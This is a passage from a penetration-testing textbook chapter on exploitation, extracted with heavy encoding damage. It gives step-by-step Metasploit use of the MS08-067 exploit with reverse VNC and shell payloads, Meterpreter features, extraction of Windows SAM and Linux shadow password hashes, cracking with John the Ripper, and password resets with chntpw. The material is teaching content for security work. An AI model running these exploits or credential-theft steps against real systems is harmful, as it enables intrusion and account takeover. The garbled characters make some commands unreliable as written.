 most newcomers are overwhelmed by the sheer number of  exploits and payloads; and usually get lost trying to find appropriate exploits
  they spend their time blindly throwing every exploit against a target and hop- ing that something sticks
 later in this chapter we will examine a tool that  works in this manner but for now we need to be a little more refined
 rather than blindly spraying exploits at a target we need to find a way to match  up known system vulnerabilities with the prepackaged exploits in metasploit
  once you have learned this simple process owning a vulnerable target becomes  a cinch
 in order to correlate a targete28099s vulnerabilities with metasploite28099s exploits  we need to review our findings from step 2
 we will start this process by focus- ing on the nessus output
 recall that nessus is a vulnerability scanner and  provides us with a list of known weaknesses or missing patches
 when review- ing the nessus output you should make notes of any findings but pay special  attention to the vulnerabilities labeled as e2809cHigh
e2809d many e2809cHighe2809d nessus vulner- abilities especially missing microsoft patches correlate directly with metasploit  exploits
 Assume that during your penetration test you uncovered a new target at iP  address 172
16
45
130
 running nmap tells you that your new target is a  windows xP machine with service Pack 3 installed
 continuing on with step 2   we run nessus against the target
 figure 4
3 shows the nessus report for  172
16
45
130
 notice there are two e2809cHighe2809d findings
 it is possible to drill down into each of the e2809cHighe2809d findings to get the specific  information from nessus
 double clicking on the first e2809cHighe2809d finding reveals  the source of this issue is a missing patch
 specifically microsoft patch ms08- 067 has not been installed on the target machine
 clicking on the second  0cThe Basics of hacking and penetration Testing 74 e2809cHighe2809d vulnerability discovered by nessus reveals another missing microsoft  patch
 this vulnerability is the result of missing microsoft patch ms09-001
  figure 4
4 highlights the nessus report showing missing patch ms08-067
 At this point we know our target has two missing patches
 Both of these  patches are labeled as e2809cHighe2809d and the descriptions that nessus provides for  both missing patches mention e2809cremote code execution
e2809d As an attacker your  heartbeat should be racing a little at this point because the chances are very  good that metasploit will be able to exploit the target for us
 next we need to head over to metasploit and look for any exploits pertaining  to ms08-067 or ms09-001
 once we have started metasploit (and updated)  we can use the e2809csearche2809d command to locate any exploits related to our nessus  findings
 to accomplish this we issue the e2809csearche2809d command followed by the  missing patch number
 for example at the e2809cmsfee80aee2809d prompt you would type: msf ee80ae search ms08-067 once the command is completed make detailed notes on the findings and  search for any other missing patches
 metasploit will search through its infor- mation and return any relevant information it finds
 figure 4
5 shows the out- put of searching for ms08-067 and ms09-001 within metasploit
 fIGURE 4
4 Screenshot Showing Missing Patch MS08-067 on the Target
 fIGURE 4
3 Nessus Output Showing Two e2809cHighe2809d Findings
 Openmirrors
com Openmirrors
com 0cExploitation ChApTER 4 75 let us review the output from figure 4
5: n we started by issuing the e2809csearche2809d command followed by the specific miss- ing patch that nessus discovered
 n After searching metasploit found a matching exploit and provided us with  several pieces of information about the exploit
 l first it provided us with a name and location; e2809cwindows/smb/ ms08_067_netapi
e2809d l next metasploit provided us with a e2809crank
e2809d it is important to pay close attention to the exploit rank
 this information pro- vides details about how dependable the exploit is (how often the exploit is suc- cessful) as well as how likely the exploit is to cause instability or crashes on the  target system
 numerically the higher an exploit is ranked the more likely it  is to succeed and the less likely it is to cause disruptions on the target system
  metasploit uses seven ratings to rank each exploit: 1
 manual 2
 low 3
 Average 4
 normal 5
 good fIGURE 4
5 Finding a Match between Nessus and Metasploit with the Search Function
 ALERT! The Metasploit e2809csearche2809d feature can also be used to locate non-Microsoft exploits
   Nessus reports will often include a CVE or BID number to reference critical  vulnerabilities
  If you are unable to locate a missing MS patch or are conducting  a penetration test against a non-Microsoft product be sure to search for matching  exploits by CVE or BID numbers!  Look for these in your Nessus scan report
 0cThe Basics of hacking and penetration Testing 76 6
 great 7
 excellent You can find more information and a formal definition of the ranking meth- odology on the metasploit
com website
 finally the metasploit search feature  presents us with a brief description of the exploit providing us with additional  details about the attack
 when all other things are held equal you should  choose exploits with a higher rank as they are less likely to disrupt the normal  functioning of your target
 now that you understand how to match up vulnerabilities in nessus with  exploits in metasploit and you have the ability to choose between two or more  metasploit exploits we are ready to unleash the full power of metasploit on  our target
 continuing with our example we will use the ms08-067 because it has a  higher ranking
 in order to run metasploit we need to provide the framework  with a series of commands
 Because metasploit is already running and we have  already found our exploit we continue by issuing the e2809cusee2809d command in the  e2809cmsfee80aee2809d terminal to set the desired exploit
 msf ee80ae use windows/smb/ms08_067_netapi this command tells metasploit to use the exploit that nessus identified
 once  we have the exploit loaded we need to view the available payloads
 this is  accomplished by entering e2809cshow payloadse2809d in the e2809cmsfee80aee2809d terminal
 msf ee80ae show payloads this will list all the available and compatible payloads for the exploit you have  chosen
 to select one of the payloads we type e2809cset payloade2809d and the payload  name into the e2809cmsfee80aee2809d terminal
 msf ee80ae set payload windows/vncinject/reverse_tcp there are many many payloads to choose from
 A full examination of the dif- ferent payloads is outside the scope of this book
 Please review the metasploit  documentation for details on each of the available payloads
 for this example  we will install Vnc on the target machine and then have that machine connect  back to us
 if you are unfamiliar with Vnc it is remote control Pc software  that allows a user to connect to a remote machine view the remote machine  and control the mouse and keyboard as if you were physically sitting at that  machine
 it works much the same as remote desktop or a terminal server
 it is important to note that the Vnc software is not currently installed on the tar- get machine
 remember that some exploits give us the ability to install software  on our target machine
 in this example we are sending an exploit to our target  machine
 if successfully executed the exploit will call the e2809cinstall vnce2809d payload and  remotely install the software on the victim machine without any user interaction
 different payloads will require different additional options to be set
 if you fail  to set the required options for a given payload your exploit will fail
 there are  0cExploitation ChApTER 4 77 few things worse than getting this far and failing to set an option
 Be sure to  watch this step closely
 to view the available options issue the e2809cshow optionse2809d  in the e2809cmsfee80aee2809d terminal: msf ee80ae show options After issuing the show options command we are presented with a series of  choices that are specific to the payload we have chosen
 when using the e2809cwin- dows/vncinject/reverse_tcpe2809d payload we see that there are two options that  need to be set because they are missing any default information
 the first is  e2809crHoste2809d and the second is e2809clHost
e2809d rHost is the iP address of the remote  host and lHost is the iP address you are attacking from
 to set these options  we issue the e2809cset option_namee2809d command in the msfee80ae terminal: msf ee80ae set RHOST 172
168
45
130 msf ee80ae set LHOST 172
168
45
135 now that you have required options set it is usually a good idea at this point  to reissue the e2809cshow optionse2809d command to ensure you are not missing any  information
 msf ee80ae show options once you are sure you have entered all the information correctly you are ready  to launch your exploit
 to send your exploit to the target machine simply type  e2809cexploite2809d into the e2809cmsfee80aee2809d terminal msf ee80ae exploit now sit back and watch as the magic happens
 to truly appreciate the beauty  and complexity of what is going on here you need to build your understanding  of buffer overflows and exploitation
 this is something that is highly encouraged  when you finish the basics covered in this book
 metasploit gives you the ability  to stand on the shoulders of giants and the power to launch incredibly complex  attacks with just a few commands
 You should revel in the moment and enjoy  the victory of conquering your target but you should also commit yourself to  learning even more
 commit yourself to really understanding exploitation
 After typing e2809cexploite2809d metasploit will go off and do its thing sending exploits  and payloads to the target
 this is where the e2809chacking like Hugh Jackmane2809d part  comes in
 if you set up everything correctly after a few seconds you will be pre- sented with a screen belonging to your victim machine
 Because our payload in  this example was a Vnc install you will have the ability to view and interact with  the target machine as if you were physically sitting in front of it
 it is hard not to  be impressed and even a little bewildered the first time you see (or complete) this  exploit in real time
 figure 4
6 shows an example of the completed metasploit  attack
 notice the computer that launched the attack is the linux Backtrack but  the attacker machine has full gUi access to the windows desktop of the victim
 Below you will find a cheat sheet of the steps required to run metasploit  against a target machine
 0cThe Basics of hacking and penetration Testing 78 1
 start metasploit: a
 open a terminal and issue the following command /pentest/exploits/ framework3/msfconsole 2
 issue the e2809csearche2809d command to search for exploits: a
 msf ee80ae search missing_patch_number 3
 issue the e2809cusee2809d command to select the desired exploit: a
 msf ee80ae use exploit_name_and_path_as_shown_in_2a 4
 issue e2809cshow payloadse2809d command to show available payloads: a
 msf ee80ae show payloads 5
 issue e2809csete2809d command to select payload a
 msf ee80ae set payload path_to_payload_as_shown_in_4a 6
 issue e2809cshow optionse2809d to view any options needing to be filled out before  exploiting the target a
 msf ee80ae show options 7
 issue the e2809csete2809d command for any options listed in 6a a
 msf ee80ae set option_name desired_option_input 8
 issue e2809cexploite2809d command to launch exploit against target a
 msf ee80ae e2809cexploite2809d now that you have a basic understanding of how to use metasploit it is impor- tant to review a few more of the basic payloads available to you
 even though  the Vnc inject is incredibly cool and great for impressing friends relatives and  coworkers it is rarely used in an actual Pt
 in most penetration tests hackers  prefer a simple shell allowing remote access and control of the target machine
  table 4
1 is a list of some basic payloads
 Please refer to the metasploit docu- mentation for a complete list
 remember one of the powers of metasploit is  the ability to mix and match exploits and payloads
 this provides a penetra- tion tester with an incredible amount of flexibility allowing the functionality  fIGURE 4
6 Screenshot Showing Successful Exploit of Windows Target
 Openmirrors
com 0cExploitation ChApTER 4 79 of metasploit to change depending on the desired outcome
 it is important that  you become familiar with the various payloads available to you
 many of these same payloads exist for linux Bsd osx and other operating  systems
 Again you can find the full details by reviewing the metasploit docu- mentation closely
 one source of confusion for many people is the difference  between similar payloads like e2809cwindows/meterpreter/bind_tcpe2809d and e2809cwin- dows/meterpreter/reverse_tcp
e2809d the keyword that causes the confusion here is  e2809creverse
e2809d there is a simple but important difference between the two payloads  and knowing when to use each will often mean the difference between an  exploite28099s success or failure
 the key difference in these attacks is the direction of  the connection after the exploit has been delivered
 in a e2809cbinde2809d payload we are both sending the exploit and making a connection  to the target from the attacking machine
 in this instance the attacker sends  the exploit to the target and the target waits passively for a connection to come  in
 After sending the exploit the attackere28099s machine then connects to the target
 in a e2809creversee2809d payload the attacking machine sends the exploit but forces the  target machine to connect back to the attacker
 in this type of attack rather than  passively waiting for an incoming connection on a specified port or service  the target machine actively makes a connection back to the attacker
 figure 4
7  should make this concept clearer
 the last metasploit topic to discuss is the meterpreter
 the meterpreter is  a powerful and flexible tool that you will need to learn to control if you are  going to master the art of metasploit
 the meta-interpreter or meterpreter is a  Table 4
1      Sample of Payloads Available for Targeting Windows Machines Metasploit Payload Name Payload Description windows/adduser Create a new user in the local administrator    group on the target machine windows/exec Execute a Windows binary (
exe) on the target    machine windows/shell_bind_tcp Open a command shell on the target machine    and wait for a connection windows/shell_reverse_tcp Target machine connects back to the attacker    and opens a command shell (on the target) windows/meterpreter/bind_tcp Target machine installs the Meterpreter and    waits for a connection windows/meterpreter/reverse_tcp Installs Meterpreter on the target machine then    creates a connection back to the attacker windows/vncinject/bind_tcp Installs VNC on the target machine and waits    for a connection windows/vncinject/reverse_tcp Installs VNC on the target machine and sends    VNC connection back to target Table 4
1 Openmirrors
com 0cThe Basics of hacking and penetration Testing 80 payload available in metasploit that gives attackers a powerful command shell  that can be used to interact with their target
 Another big advantage of the meterpreter is the fact that it runs entirely   in memory and never utilizes the hard drive
 this tactic provides a layer of  stealth that helps it evade many anti-virus systems and confounds some foren- sic tools
 the meterpreter functions in a manner similar to windows cmd
exe or the linux  /bin/sh command
 once installed on the victim machine it allows the attacker  to interact with and execute commands on the target as if the attacker were sit- ting at the local machine
 it is very important to understand that the meterpreter  will run with the privileges associated with the program that was exploited
 for  example assume that our favorite network Admin Ben owned has disregarded  all common sense and is running his irc program as e2809croote2809d (the linux equiva- lent of the windows e2809cAdministratore2809d account)
 Unfortunately for Ben his sys- tem is out-of-date and during a recent penetration test the attacker was able to  exploit Bene28099s irc client installing metasploite28099s meterpreter
 Because Ben was run- ning the irc program as the root account and because the irc program was  exploited by metasploit the meterpreter is now able to function with all the  privileges and rights of the e2809croote2809d account! this is one example in a long list of  reasons why it is important to run all of your programs with the most restrictive  privileges possible and avoid running anything as root or administrator
 Another reason for using the meterpreter over a traditional cmd or linux shell  stems from the fact that starting either of these on a target machine often starts  a new process that can be detected by a keen user or wily administrator
 this  means that the attacker raises his or her visibility and chances of detection  while interacting with the target machine
 furthermore both the cmd
exe and / bin/sh provide a limited number of tools and commands that can be accessed
  in contrast the meterpreter was built from the ground up to be used as sort of  fIGURE 4
7 Difference between Bind and Reverse Payloads
 Openmirrors
com 0cExploitation ChApTER 4 81 e2809chackere28099s cmde2809d with the ability to access and control the most popular tools  and functions needed during a penetration test
 the meterpreter has many great features that are built in by default
 Basic func- tions include the e2809cmigratee2809d command which is useful for moving the server to  another process
 migrating the meterpreter server to another process is important  in case the vulnerable service you attacked is shut down or stopped
 Another use- ful function is the e2809ccate2809d command that can be used to display local file contents  on the screen
 this is useful for reviewing various files on the target
 the e2809cdown- loade2809d command allows you to pull a file or directory from the target machine  making a local copy on the attackere28099s machine
 the e2809cuploade2809d command can be  used to move files from the attackere28099s machine to the target machine
 the e2809cedite2809d  command can be used to make changes to simple files
 the e2809cexecutee2809d com- mand can be used to issue a command and have it run on the remote machine  whereas e2809ckille2809d can be used to stop a process
 the following commands are  also useful and provide the exact same function as they do on a normal linux  machine: e2809ccde2809d e2809clse2809d e2809cpse2809d e2809cshutdowne2809d e2809cmkdire2809d e2809cpwde2809d and e2809cifconfig
e2809d some of the more advanced features include the ability to extract password  hashes through the sAm Juicer tool the ability to interact with a ruby shell the  ability to load and execute arbitrary dlls on the target and even the ability to  lock out the local keyboard and mouse! As you can see gaining access to a meterpreter shell is one of the most power- ful flexible and stealthy ways that an attacker can interact with a target
 it is  well worth your time to learn how to use this handy tool
 JOhN ThE RIppER: KING Of ThE pASSWORD  CRACKERS it is hard to imagine discussing a topic like the basics of hacking without dis- cussing passwords and password cracking
 no matter what we do or how far  we advance it appears that passwords remain the most popular way to protect  data and allow access to systems
 with this in mind let us take a brief detour  to cover the basics of password cracking
 there are several reasons why a penetration tester would be interested in crack- ing passwords
 first and foremost this is a great technique for elevating and  escalating privileges
 consider the following example: assume that you were  able to compromise a target system but after logging in you discover that you  have no rights on that system
 no matter what you do you are unable to read  and write to the targete28099s files and folders and even worse you are unable to  install any new software
 this is often the case when you get access to a low  privileged account belonging to the e2809cusere2809d or e2809cgueste2809d group
 if the account you accessed has no or few rights you will be unable to per- form many of the required steps to further compromise the system
 i have actu- ally been involved with several red team exercises where seemingly competent  hackers are at a complete loss when presented with an unprivileged account
  0cThe Basics of hacking and penetration Testing 82 they throw up their hands and say e2809cdoes anyone want unprivileged access to  this machine? i done28099t know what to do with it
e2809d in this case password crack- ing is certainly a useful way to escalate privileges and often allows us to gain  administrative rights on a target machine
 Another reason for cracking passwords and escalating privileges is that many  of the tools we run as penetration testers require administrative-level access in  order to install and execute properly
 it is not uncommon for penetration tes- ters to find themselves in a situation where they were able to crack the local  administrator password (the local admin account on a machine) and have  this password turn out to be the exactly same password that the network  Administrator was using for the domain administrator account
 if we can access the password hashes on a target machine the chances are good  that with enough time John the ripper (Jtr) a password-cracking tool can  discover the plaintext version of a password
 Password hashes are e280a6 and can  be accessed remotely or locally
 regardless of how we access the hash file the  steps and tools required to crack the passwords remain the same
 in its most  basic form password cracking consists of two parts: 1
 locate and download the target systeme28099s password hash file
 2
 Use a tool to convert the hashed (encrypted) passwords into a plaintext  password
 most systems do not store your password as the plaintext value you enter but  rather they store an encrypted version of the password
 this encrypted version  is called a hash
 for example assume you pick a password e2809cqwertye2809c (which is  obviously a bad idea)
 when you log into your Pc you type your password  e2809cqwertye2809d to access the system
 However behind the scenes your computer is  actually calculating and checking an encrypted version of the password you  entered
 this encrypted version or hash of your password appears to be a ran- dom string of characters and numbers
 different systems use different hashing algorithms to create their password  hashes
 most systems store their password hashes in a single location
 this  hash file usually contains the encrypted passwords for several users and sys- tem accounts
 Unfortunately gaining access to the password hashes is only  half the battle because simply viewing or even memorizing a password hash  (if such a thing were possible) is not enough to determine the plaintext
 this  is because technically it is not supposed to be possible to work backward from  a hash to plaintext
 By its definition a hash once encrypted is never meant to  be unencrypted
 ALERT! Password Hint #1: Never never never use the same password for your local machine  administrator as you do for your domain administrator account
 0cExploitation ChApTER 4 83 consider the following example
 Assume that we have located a password  hash and we want to discover the plaintext value
 it is important to understand  that in most cases we need the plaintext password not the hashed password
  entering the hashed value into the system will not get us access because this  would simply cause the system to hash the hash (which is obviously incor- rect)
 in order to discover the plaintext version of a password we need to circle  through a series of steps
 first we select a hashing algorithm next we pick a plaintext word third we  encrypt the plaintext word with the hashing algorithm and finally we compare  the output or hash of the chosen word with the hash from our target
 if the  hashes match we know the plaintext password because no two different plain- text words should produce the exact same hash
 Although this may seem like a clumsy awkward or slow process for a human  computers specialize in tasks like this
 given the computing power available  today completing the four-step process outlined above is trivial for a modern  machine
 the speed at which John the ripper can generate password hashes  will vary depending on the algorithm being used to create the hashes and the  hardware that is running John the ripper
 it is safe to say that even an average  computer is capable of generating millions of windows (lm) password guesses  every second
 John the ripper includes a nifty feature that allows you to bench- mark your computere28099s performance
 this benchmark will be measured in  cracks per second (c/s)
 You can run this by navigating to the following direc- tory /pentest/passwords/jtr and running the following command: 
/john --test this will provide you with a list of performance metrics and let you know how  efficient your system is at generating guesses based on your hardware and the  algorithm being used to hash the passwords
 Before we can crack passwords we first have to locate the password hash file
  As mentioned earlier most systems store the encrypted password hashes in a  single location
 in windows-based systems the hashes are stored in a special  file called the sAm (security Account manager) file
 on nt-based windows  systems including windows 2000 and above the sAm file is located in the c:\\\\ windows\\\\system32\\\\config\\\\ directory
 now that we know the location of the  sAm file we need to extract the password hashes from the file
 Because the  sAm file holds some very important information microsoft has wisely added  some additional security features to help protect the file
 first the sAm file is actually locked when the operating system boots up
 this  means that while the os is running we do not have the ability to open or copy  the sAm file
 in addition to the lock the entire sAm file is encrypted and not  viewable
 fortunately there is a way to bypass both of these restrictions
 on a remote  machine we can use the meterpreter and sAm Juicer to access the hashes on a live  target
 if we have physical access to the system we can also boot to an alternate  Openmirrors
com Openmirrors
com 0cThe Basics of hacking and penetration Testing 84 operating system like Backtrack
 By booting our target to an alternate operating  system we are able to bypass the windows sAm lock
 this is possible because  the windows os never starts the lock never engages and we are free to access the  sAm file
 Unfortunately the sAm file is still encrypted so we need to use a tool to  access the hashes
 fortunately the required tool is built into Backtrack
 After booting the target system to an alternate operating system the first thing  you need to do is to mount the local hard drive
 Be sure to mount the drive  containing the windows folder
 we can accomplish this by opening a terminal  and typing: mount /dev/sda1 /mnt/sda1 it is important that you mount the correct drive as not all systems will have  a /dev/sda1
 if you are unsure about which drive to mount you can run the  e2809cfdisk -le2809d command
 the fdisk tool will list each of the drives available on your  target system and should help you determine which drive you need to mount
  You may also need to create a mount point in the /mnt directory
 to do so you  can simply use the e2809cmkdire2809d command: mkdir /mnt/sda1 if you are unsure about how to use the mount command or locate the proper  drive please review the linux man pages for the mount command or practice  your newly acquired google skills from step 1
 once you have successfully mounted the local drive in Backtrack you will be  able to browse the windows e2809cc:\\\\e2809d drive
 You should now be able to navigate to  the sAm file
 You can do so by typing the following command into a terminal  window: cd /mnt/sda1/Windows/system32/config if everything has gone as planned you should be in the directory containing  the sAm file
 to view the contents of the current folder issue the e2809clse2809d com- mand in the terminal window you should see the sAm file
 figure 4
8 shows a  screenshot displaying each of the steps required to locate the sAm file (assum- ing you have a /mnt/sda1 directory already created)
 in step 1 we issue the e2809cfdisk e28093le2809d command to view the available drives on the  local disk
 in step 2 fdisk responds back by stating that there is a drive at / dev/sda1
 in step 3 we use this information to mount the drive into our /mnt/ sda1 folder so that we can access the local hard drive
 now that our drive is  mounted and available in step 4 we move into the directory containing the  sAm file by using the e2809ccde2809d (change directory) command
 in step 5 we verify  that we are in the proper directory by issuing the e2809clse2809d command to list the con- tents of the current folder
 finally step 6 shows the sAm file
 now that we have located the sAm file we can use a tool called samdump2 to  extract the hashes
 At this point we have the ability to view and copy the sAm  file in effect overcoming the first security feature but at this point the sAm  0cExploitation ChApTER 4 85 file is still encrypted
 in order to view an unencrypted copy of the sAm file we  need to run samdump2
 samdump2 utilizes a file on the local machine called  e2809csysteme2809d to decrypt the sAm file
 fortunately the e2809csysteme2809d file is located in the  same directory as the sAm file
 to run samdump2 we issue the e2809csamdump2e2809d command followed by the name  and location of the e2809csysteme2809d file followed by the name and location of the  sAm file we want to view
 recall that earlier we had issued the e2809ccde2809d command  to navigate to the windows/system32/config folder
 At this point we can extract  the contents of the sAm file by running the following command in a terminal: samdump2 system SAM ee80ae /tmp/hashes
txt this will invoke the samdump2 program and appending the e2809c ee80ae  hashes
txte2809d  command will save the results to a file called e2809chashes
txte2809d in Backtracke28099s /tmp  directory
 figure 4
9 shows a screenshot of the samdump2 command and dis- plays the contents of the hashes
txt file
 now that we have the password hashes saved we need to transfer them off the  live Backtrack disk
 this can be done by simply e-mailing the hashes
txt file  to yourself or inserting a thumb drive and creating a local copy of the hashes
  either way make sure you save the hashes
txt file because you are working off  a e2809clivee2809d cd and your changes are not persistent
 this means when you reboot  the target machine all the files you created in the Backtrack disk will be gone  for good! now that you have a copy of the password hashes you can begin the process of  cracking the passwords
 to accomplish this task we will use a tool called John  the ripper
 like each of the other tools we have examined John the ripper is  available for free
 You can download it by going to http://www
openwall
com/ fIGURE 4
8 Locating the SAM File for Password Cracking
 Openmirrors
com Openmirrors
com 0cThe Basics of hacking and penetration Testing 86 john
 Before we begin utilizing John the ripper it is important that you under- stand how microsoft creates password hashes
 originally microsoft utilized a hashing algorithm called lan manager (or lm  for short)
 lm hashes suffered from several key weaknesses that made password  cracking a trivial task
 first when lm hashes are created the entire password  is converted to uppercase
 converting all the characters used in a password to  uppercase is a fundamental flaw that greatly reduces the strength of any pass- word
 this is because technically if we hash the word e2809cPassworde2809d and e2809cpass- worde2809d even though they are only different by a single case of a single letter  these two words will produce a different hash output
 However because lm  hashes convert every character to upper case we greatly reduce the number of  guesses we need to make
 instead of requiring an attacker to guess e2809cPassworde2809d  e2809cPassworde2809d e2809cPAssworde2809d and so on with every possible combination of upper  and lower case letters the attacker only needs to make the single guess of  e2809cPAssword
e2809d to further compound this issue every lan manager password is 14 characters  in length
 if a password is less than 14 characters the missing letters are filled  in with null values
 if a password is greater than 14 characters the password is  truncated at 14 characters
 the final nail in the coffin of lan manager passwords (as if it needed another)  is the fact that all stored passwords which are now 14 characters in length  actually get split in half and stored as two individual 7-character passwords
  the length of a password is one source of its strength; unfortunately because of  the lm design the max password that needs to be cracked is 7 characters
 John  will actually attempt to crack each of the 7-character halves of the password  individually and typically makes very short work out of it
 take a moment to consider these flaws
 when taken together they represent  quite a blow to the security of any system
 suppose our favorite network  Admin Ben owned is utilizing lm hashes on his windows machine
 He is  aware of the dangers of weak passwords so he creates the following password  which he believes is secure: supersecretPassword!@#$
 fIGURE 4
9 Extracting and Viewing the Password Hashes with Samdump2
 0cExploitation ChApTER 4 87 Unfortunately for Ben he is operating under a false sense of security
 His complex  password will actually undergo a series of changes that make it much less secure
  first the password is converted to all uppercase: sUPersecretPAssword!@#$
  next the password is truncated to be exactly 14 characters with any remain- ing letters simply discarded
 the new password is: sUPersecretPAs
 finally  the password is broken into equal halves of 7 characters each: sUPerse and  cretPAs
 when a hacker or penetration tester gets ahold of Bene28099s password the attacker  has to crack two simple all-uppercase 7-character passwords
 that is a drasti- cally simpler task than the original password of supersecretPassword!@#$
 fortunately microsoft addressed these issues and now uses a much more  secure algorithm called ntlm to create its password hashes
 However as a  penetration tester you will still find systems which are utilizing and storing lm  hashes
 modern versions of windows do not use or store lm hashes by default;  however there are options to enable lm on these systems
 this e2809cfeaturee2809d is  implemented to support backward compatibility with legacy systems
 As a side  note you should always upgrade or discontinue the use of any legacy software  that requires you to use lm hashes
 old systems often put your entire network  at risk
 John the ripper is capable of cracking passwords by using a password dic- tionary or by brute forcing letter combinations
 As we discussed earlier pass- word dictionaries are lists of words and letter combinations
 one advantage of  using a password dictionary is that it is very efficient
 the main disadvantage  of this technique is that if the exact password is not in the dictionary John  the ripper will be unsuccessful
 Another method for cracking passwords is to  brute force letter combinations
 Brute forcing letter combinations means that  the password cracker will generate passwords in a sequential order until it has  exhausted every possible combination
 for example the password cracker will  begin by guessing the password as a single letter: e2809ca
e2809d if that guess is unsuccess- ful it will try e2809caa
e2809d if that guess is unsuccessful it will move to e2809caaae2809d and so on
  this process is typically much slower than a dictionary guessing attack but the  advantage is that given enough time the password will eventually be found
 if  we try every letter in every possible combination there is simply nowhere for a  password to hide
 However it is important to point out that brute forcing pass- words of significant length and cipher would take many lifetimes to crack
 John the ripper is built into Backtrack
 to run it we can simply enter the fol- lowing command into a terminal: john invoking this command will actually run a script that will move us to the /pen- test/passwords/jtr directory
 once inside the /pentest/passwords/jrt directory  we can issue the following command: 
/john /tmp/hashes
txt Openmirrors
com 0cThe Basics of hacking and penetration Testing 88 in the command above e2809c
/johne2809d is used to invoke the password cracking John  the ripper program
 do not omit the e2809c
/e2809d before the john command
 this  forces linux to run the program in the current directory
 the next command e2809c/ tmp/hashes
txte2809d is used to specify the location of the hashes that we extracted  using samdump2
 if you saved your hashes
txt file to a different location you  will need to change this path
 if your target machine is using ntlm hashes you will need to add the e2809c-f:nte2809d  switch
 in this case the command would look like the following: 
/john /tmp/hashes
txt e28093f:NT After issuing the appropriate command to instruct John the ripper to run the  program will attempt to crack the passwords contained in the hashes
txt file
  when John is successful in finding a password it will display it to the screen
  figure 4
10 shows the commands used to move into the John directory running  John the ripper and the output of usernames and passwords that were cracked
 Below you will find a brief recap of the steps used to crack windows passwords
  it is important that you practice and fully understand how to complete each of  the steps below
 if you are given physical access to a machine you should be  able to complete steps 1e280934 in less than five minutes
 the time it takes to com- plete step 5 the actual cracking of the passwords will vary depending on your  resources and the quality or strength of the passwords you are cracking
 You  should also become comfortable enough with each of the steps that you can  perform them without the aid of notes or a cheat sheet: 1
 shut down the target machine
 2
 Boot the target to Backtack
 3
 mount the local hard drive
 4
 Use samdump2 to extract the hashes
 5
 Use John the ripper to crack the passwords
 the process of cracking linux and osx passwords is much the same as the  method described above with a few slight modifications
 linux systems do not  fIGURE 4
10 Cracked Passwords with John the Ripper
 0cExploitation ChApTER 4 89 use a sAm file to store the password hashes
 rather the encrypted linux pass- word hashes are contained in a file called the e2809cshadowe2809d file which is located at:  /etc/shadow
 However before you can use the /etc/shadow file with John the ripper it must be  joined with the /etc/passwd file
 in many respects this is similar to how we had to  use the e2809csysteme2809d file with the sAm file to extract windows password hashes
 John  the ripper includes a function to combine the shadow and password files so you  can continue cracking the passwords
 to accomplish this task you need to use the  e2809cunshadowe2809d command which is located in the /pentest/passwords/jtr directory
  to accomplish this issue the following command in a terminal: 
/unshadow /etc/passwd /etc/shadow ee80ae /tmp/linux_hashes
txt Here again it is important not to forget the e2809c
/e2809d in front of the e2809cunshadowe2809d  command
 this command will join the /etc/passwd with the /etc/shadow file  and store the results in a file called e2809clinux_hashes
txte2809d in the /tmp directory
 now that we have extracted the hashes we are almost ready to begin cracking  the linux passwords
 However before we can start we need to use a version of  John the ripper that supports cracking different types of password hashes
 if  you use a wrong version or an unpatched version of John the ripper the pro- gram will return a message saying e2809cno password hashes loaded
e2809d most mod- ern linux systems store their passwords using the sHA hashing algorithm
 with  this in mind we have two choices: we can either patch the version of John the  ripper or download a prepatched version
 if you are unfamiliar with the patch- ing process and manually compiling linux source code it may be easier to find  a prepatched version that supports sHA hashes
 once we have the correct ver- sion of John the ripper running we can complete this task by issuing the fol- lowing command from inside the /pentest/passwords/jtr directory: 
/john /tmp/linux_hashes
txt John the ripper contains many more options and switches that can be used to  greatly improve your cracking time and chances of success
 You should spend  some time learning about each of these switches
 pASSWORD RESETTING: KIND Of LIKE DRIvING A  BULLDOZER ThROUGh ThE SIDE Of A BUILDING there is another option for defeating passwords
 this technique requires phys- ical access to the target machine and although it is very effective at gaining  you access to the target it is also very noisy
 in the previous section password  cracking was discussed
 if a skilled penetration tester is able to access a target  machine alone for just a few minutes he or she should be able to get a copy of  the password hashes
 All things considered this could be a very stealthy attack  and difficult to detect
 in most cases the penetration tester will leave few clues  that he or she were ever on the target machine
 remember the penetration tes- ter can take the passwords off-site and crack them at his or her leisure
 Openmirrors
com 0cThe Basics of hacking and penetration Testing 90 Password resetting is another technique that can be used to gain access to a  system or to escalate privileges; however this method is much less subtle than  password cracking
 when first introducing this topic it is common to compare  gaining access to a windows machine by performing a password reset to a bur- glar driving a bulldozer through the wall of a store in order to gain access to  the premises
 it may be effective but you can be sure that the storeowner and  employees will know that they were broken into
 Password resetting is a technique that allows an attacker to literally overwrite  the sAm file and create a new password for any user on a modern windows  system
 this process can be performed without ever knowing the original pass- word although it does require you to have physical access to the machine
 As with all other techniques discussed in this book it is vital that you  have authorization before proceeding with this attack
 it is also important  you understand the implications of this technique
 once you change the   password there will be no way to restore it
 As described in the beginning  of this section it is very much like a burglar driving a bulldozer through the   side of a building
 the next time a user attempts to log in and he or she finds  that the password has been changed you can bet that someone is going to  notice
 with that in mind this is still an incredibly powerful technique and one that  can be very handy for gaining access to a system
 to perform password reset- ting you will need to boot the target system to a Backtrack dVd
 once booted  from the terminal you will need to mount the physical hard drive of the system  containing the sAm file
 You can find the instructions for performing this task  in the previous section
 After mounting the hard drive you need to navigate to  the e2809c/pentest/passwords/chntpwe2809d directory
 You can accomplish this by enter- ing the following command: cd /pentest/passwords/chntpw from here you can run the e2809cchntpwe2809d command to reset the password
 to  review the full options and available switches you can issue the following  command: 
/chntpw e28093h Assume that you want to reset the administrator password on your target  machine
 to accomplish this you would issue the following command: 
/chntpw e28093i /mnt/sda1/WINDOWS/system32/config/SAM in the command above the e2809c
/chntpwe2809d is used to start the password resetting  program
 the e2809c-ie2809d is used to run the program interactively and allow you to  choose the user you would like reset
 the e2809c/mnt/sda1/windows/system32/ config/sAme2809d is the mounted directory containing the sAm file of our target  machine
 it is important to make sure you have access to the sAm file; remem- ber not all drives are listed as sda1
 As mentioned earlier running the e2809cfdisk  e28093le2809d command can be helpful in determining the appropriate drive
 0cExploitation ChApTER 4 91 After running the e2809c
/chntpw e28093i /mnt/sda1/windows/system32/config/sAme2809d  command you will be presented with a series of interactive menu-driven  options that will allow you to reset the password for the desired user
 each of  the steps is very clearly laid out and described; you simply need to take a few  moments to read what is being asked
 the program is actually designed with a  series of e2809cdefaulte2809d answers and in most cases you can simply hit the e2809centere2809d key  to accept the default choice
 As shown in figure 4
11 after loading the first question you are asked is:  e2809cwhat to do [1]?e2809d Above the question you will see a series of five options to  choose from
